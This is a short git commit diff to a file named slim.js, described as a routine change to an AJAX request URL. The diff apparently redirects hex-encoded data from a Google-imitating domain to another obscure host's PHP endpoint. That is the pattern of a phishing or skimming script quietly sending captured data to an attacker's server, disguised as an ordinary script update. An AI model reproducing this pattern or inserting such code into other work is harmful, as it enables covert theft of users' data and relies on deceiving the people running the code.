0f8b4472b7f7c56f49b95f1ce1717032689925fd
styllesheett <dirzzkecechnel@gmail.com>
2025-11-09 14:56:30 +0800

    Change AJAX request URL in slim.js
    Updated URL in AJAX request to a new endpoint.

--- slim.js
+++ slim.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://img-google.dirzxrapz.biz.id/img/?json=" +
+                    "https://gett1.biz.id/mekeber.php" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
